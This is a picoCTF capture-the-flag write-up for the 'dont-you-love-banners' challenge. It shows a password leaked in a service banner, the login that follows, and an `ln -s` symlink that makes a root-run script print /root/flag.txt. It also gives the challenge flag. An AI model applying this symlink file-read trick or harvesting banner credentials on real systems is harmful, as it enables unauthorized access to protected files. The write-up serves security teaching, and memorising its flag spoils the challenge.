# dont-you-love-banners

Can you abuse the banner?

Additional details will be available after launching your challenge instance.

-----

Launching the instance, we are given two ports to connect, namely `61985` and `53299` with the former being observed leaking sensitive information.

Connecting to this via `nc`, we get the following:

```                                                       
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

Connecting to the second port, inputting the password string, and answering the subsequent questions, we get access to the instance as the `player` user:

```
what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
john draper
```

Within the `/home/player` directory there are two files, `banner` and `text`, which contain:

```
$ cat banner
*************************************
**************WELCOME****************
*************************************
```

```
$ cat text
keep digging
```

Listing the contents of `/root/home` reveals the `flag.txt` file which we cannot read and `script.py` which carries out the logic that gave us access to the instance.

Within the script, it reads the contents of `/home/player/banner` to display it out. As we have access to this file as the `player` user, we can create a symlink to `/root/flag.txt` to read its contents:

```
$ ls -la
...
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
$ ls -la /root
...
-rwx------ 1 root root   46 Mar  9  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
```

```
$ ln -s /root/flag.txt /home/player/banner
```

Connecting to the instance as before with `nc`, we get the flag returned in place of the welcome banner:

```
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}
```